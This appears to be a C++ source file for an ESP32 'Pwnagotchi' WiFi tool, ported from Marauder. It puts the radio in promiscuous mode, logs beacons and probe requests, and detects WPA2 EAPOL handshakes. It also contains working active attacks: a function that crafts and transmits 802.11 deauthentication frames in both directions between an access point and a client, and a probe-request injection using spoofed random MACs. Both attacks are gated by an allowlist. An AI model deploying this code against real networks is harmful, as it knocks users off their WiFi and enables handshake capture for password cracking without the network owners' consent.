#include <Arduino.h>
#include "PwnagotchiWiFiCore.h"
#include <WiFi.h>
#include <string.h>

PwnagotchiWiFiCore wifi_core;

static PwnagotchiWiFiCore* g_instance = nullptr;

void _pwnCoreCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (g_instance) g_instance->snifferCallback(buf, type);
}

PwnagotchiWiFiCore::PwnagotchiWiFiCore()
    : current_channel(1), packets_received(0), aps_discovered(0),
      clients_discovered(0), handshakes_captured(0), last_channel_hop(0),
      last_activity_reset(0) {
    g_instance = this;
    memset(channel_activity, 0, sizeof(channel_activity));

    // Deauth frame template — matches Marauder's deauth_frame_default[26]
    static const uint8_t tmpl[26] = {
        0xc0, 0x00, 0x3a, 0x01,              // FC=Deauth, Duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // [4..9]  Addr1 (DA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [10..15] Addr2 (SA)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // [16..21] Addr3 (BSSID)
        0xf0, 0xff,                           // [22..23] Seq control
        0x02, 0x00                            // [24..25] Reason=2 (prev auth no longer valid)
    };
    memcpy(deauth_frame, tmpl, 26);
}

PwnagotchiWiFiCore::~PwnagotchiWiFiCore() {
    deinit();
}

void PwnagotchiWiFiCore::init() {
    Serial.println(F("[WiFiCore] Initializing..."));

    // STA mode: handles esp_wifi_init + esp_wifi_start internally,
    // which is required before esp_wifi_set_promiscuous can be called
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    wifi_promiscuous_filter_t filt = {};
    // Mgmt frames (beacons, probes) + data frames (EAPOL handshakes)
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&_pwnCoreCallback);
    esp_wifi_set_promiscuous(true);

    setChannel(current_channel);
    Serial.println(F("[WiFiCore] Ready"));
}

void PwnagotchiWiFiCore::deinit() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
}

void PwnagotchiWiFiCore::startBeaconSniff() { init(); }
void PwnagotchiWiFiCore::stopSniffing()     { deinit(); }

void PwnagotchiWiFiCore::hopChannel() {
    uint32_t now = millis();

    // Reset activity counters every 60 seconds to prevent stagnation
    if (now - last_activity_reset > 60000UL) {
        memset(channel_activity, 0, sizeof(channel_activity));
        last_activity_reset = now;
    }

    // Activity-weighted channel selection (Marauder's filtered channelHop concept):
    // channels that recently saw more APs get proportionally more visits.
    // weight = 1 + min(activity, 3), so max ratio is 4:1 (very active vs idle)
    uint16_t weights[PWN_CHANNEL_MAX];
    uint16_t total = 0;
    for (int i = 0; i < PWN_CHANNEL_MAX; i++) {
        uint8_t act = (channel_activity[i] < 3) ? channel_activity[i] : 3;
        weights[i] = 1 + act;
        total += weights[i];
    }

    uint16_t r = (uint16_t)(random(total));
    uint16_t acc = 0;
    uint8_t next_ch = 1;
    for (int i = 0; i < PWN_CHANNEL_MAX; i++) {
        acc += weights[i];
        if (r < acc) {
            next_ch = (uint8_t)(i + 1);
            break;
        }
    }

    setChannel(next_ch);
    last_channel_hop = now;
}

void PwnagotchiWiFiCore::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 13) return;
    current_channel = channel;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

uint8_t PwnagotchiWiFiCore::getCurrentChannel() { return current_channel; }

PwnagotchiStats PwnagotchiWiFiCore::getStats() {
    PwnagotchiStats s;
    s.total_aps        = aps_discovered;
    s.total_clients    = clients_discovered;
    s.total_handshakes = handshakes_captured;
    s.current_channel  = current_channel;
    s.packets_received = packets_received;
    return s;
}

uint32_t PwnagotchiWiFiCore::getAPCount()        { return aps_discovered; }
uint32_t PwnagotchiWiFiCore::getClientCount()    { return clients_discovered; }
uint32_t PwnagotchiWiFiCore::getHandshakeCount() { return handshakes_captured; }

// ─── Sniffer callback ────────────────────────────────────────────────────────

void PwnagotchiWiFiCore::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t length = pkt->rx_ctrl.sig_len;
    const uint8_t* frame = pkt->payload;

    if (length < 4) return;
    packets_received++;

    uint8_t frame_subtype = (frame[0] >> 4) & 0xF;

    if (type == WIFI_PKT_MGMT) {
        if (frame_subtype == 8)      parseBeaconFrame(frame, length);
        else if (frame_subtype == 4) parseProbeRequestFrame(frame, length);
    }
    else if (type == WIFI_PKT_DATA) {
        if (detectEapol(frame, length)) {
            handshakes_captured++;
            Serial.printf("[EAPOL] Handshake captured! Total=%u CH=%d\n",
                          handshakes_captured, current_channel);
        }
    }
}

// ─── Beacon frame parser (Marauder eapolSnifferCallback style) ───────────────

void PwnagotchiWiFiCore::parseBeaconFrame(const uint8_t* frame, uint16_t length) {
    // 802.11 Beacon MAC header = 24 bytes
    // Fixed fields (timestamp 8 + interval 2 + capability 2) = 12 bytes
    // SSID IE starts at offset 36
    if (length < 36) return;

    aps_discovered++;

    // Update per-channel activity for weighted hop
    if (current_channel >= 1 && current_channel <= PWN_CHANNEL_MAX) {
        uint8_t idx = current_channel - 1;
        if (channel_activity[idx] < 255) channel_activity[idx]++;
    }

    // SA (= BSSID for beacons) is at frame[10..15]; Addr3 also holds BSSID at [16..21]
    const uint8_t* bssid = frame + 10;

    // Extract SSID from tagged params — tag 0 at offset 36
    char ssid[33] = {};
    if (length > 38 && frame[36] == 0x00) {
        uint8_t ssid_len = frame[37];
        if (ssid_len > 32) ssid_len = 32;
        uint16_t end = (uint16_t)(38 + ssid_len);
        if (end <= length) {
            memcpy(ssid, frame + 38, ssid_len);
            ssid[ssid_len] = '\0';
        }
    }

    Serial.printf("[Beacon] %02x:%02x:%02x:%02x:%02x:%02x  SSID:\"%s\"  CH:%d\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  ssid, current_channel);
}

void PwnagotchiWiFiCore::parseProbeRequestFrame(const uint8_t* frame, uint16_t length) {
    if (length < 24) return;
    clients_discovered++;
    const uint8_t* src = frame + 10;  // SA
    Serial.printf("[Probe ] SRC:%02x:%02x:%02x:%02x:%02x:%02x  CH:%d\n",
                  src[0], src[1], src[2], src[3], src[4], src[5], current_channel);
}

// ─── EAPOL / WPA2 4-way handshake detection ──────────────────────────────────
// Ported from Marauder's eapolSnifferCallback approach:
// Check data frame payload for LLC/SNAP header with EtherType 0x888E (802.1X)

bool PwnagotchiWiFiCore::detectEapol(const uint8_t* frame, uint16_t length) {
    // Only process data frames (type bits [3:2] = 0b10)
    if ((frame[0] & 0x0C) != 0x08) return false;

    // Determine header length: QoS data subtypes (bit 7 of frame[0]) add 2 bytes
    uint8_t subtype = (frame[0] >> 4) & 0xF;
    uint16_t hdr_len = (subtype & 0x8) ? 26 : 24;

    // LLC/SNAP requires 8 bytes: AA AA 03 00 00 00 88 8E
    if (length < (uint16_t)(hdr_len + 8)) return false;

    const uint8_t* llc = frame + hdr_len;
    return (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
            llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
            llc[6] == 0x88 && llc[7] == 0x8E);
}

// ─── Active attack methods (allowlist-gated) ─────────────────────────────────

void PwnagotchiWiFiCore::sendDeauth(const uint8_t* bssid, uint8_t channel, const uint8_t* mac) {
    if (!allowlist.isAllowlisted(bssid)) {
        Serial.printf("[WiFiCore] Deauth BLOCKED — BSSID %02x:%02x:%02x:%02x:%02x:%02x not in allowlist\n",
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        return;
    }

    setChannel(channel);
    delay(1);

    // Direction 1: AP → client  (addr1=client, addr2=BSSID, addr3=BSSID)
    memcpy(deauth_frame + 4,  mac,  6);
    memcpy(deauth_frame + 10, bssid, 6);
    memcpy(deauth_frame + 16, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

    // Direction 2: client → AP  (addr1=BSSID, addr2=client, addr3=BSSID)
    memcpy(deauth_frame + 4,  bssid, 6);
    memcpy(deauth_frame + 10, mac,  6);
    memcpy(deauth_frame + 16, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

    Serial.printf("[WiFiCore] Deauth sent → BSSID:%02x:%02x:%02x:%02x:%02x:%02x CH:%d\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
}

void PwnagotchiWiFiCore::sendProbeAttack(const uint8_t* target_bssid, const char* ssid, uint8_t channel) {
    if (!allowlist.isAllowlisted(target_bssid)) {
        Serial.printf("[WiFiCore] ProbeAttack BLOCKED — BSSID not in allowlist\n");
        return;
    }

    uint8_t ssid_len = ssid ? (uint8_t)strlen(ssid) : 0;
    if (ssid_len > 32) ssid_len = 32;

    // Supported-rates + HT-Capabilities IEs (from Marauder's postSSID / sendProbeAttack)
    static const uint8_t post_ie[] = {
        0x01, 0x08, 0x8c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c,
        0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 0xff, 0x00, 0x00, 0x7e,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00
    };

    // Fixed max size: 24 (hdr) + 2 (SSID tag+len) + 32 (max SSID) + 30 (IEs) = 88
    uint8_t probe[88];
    uint8_t frame_len = 24 + 2 + ssid_len + (uint8_t)sizeof(post_ie);
    memset(probe, 0, sizeof(probe));

    probe[0] = 0x40; probe[1] = 0x00;          // FC: Probe Request
    // Duration = 0, Seq = 0 (already zeroed)
    memset(probe + 4, 0xFF, 6);                 // DA = broadcast
    // SA: locally-administered random unicast MAC
    probe[10] = (uint8_t)((random(256) & 0xFE) | 0x02);
    for (int i = 11; i < 16; i++) probe[i] = (uint8_t)random(256);
    memset(probe + 16, 0xFF, 6);                // BSSID = broadcast
    probe[24] = 0x00;                           // SSID tag ID
    probe[25] = ssid_len;
    if (ssid_len > 0) memcpy(probe + 26, ssid, ssid_len);
    memcpy(probe + 26 + ssid_len, post_ie, sizeof(post_ie));

    setChannel(channel);
    delay(1);

    esp_wifi_80211_tx(WIFI_IF_STA, probe, frame_len, false);
    esp_wifi_80211_tx(WIFI_IF_STA, probe, frame_len, false);
    esp_wifi_80211_tx(WIFI_IF_STA, probe, frame_len, false);

    Serial.printf("[WiFiCore] ProbeAttack sent  SSID:\"%s\"  CH:%d\n",
                  ssid ? ssid : "(empty)", channel);
}
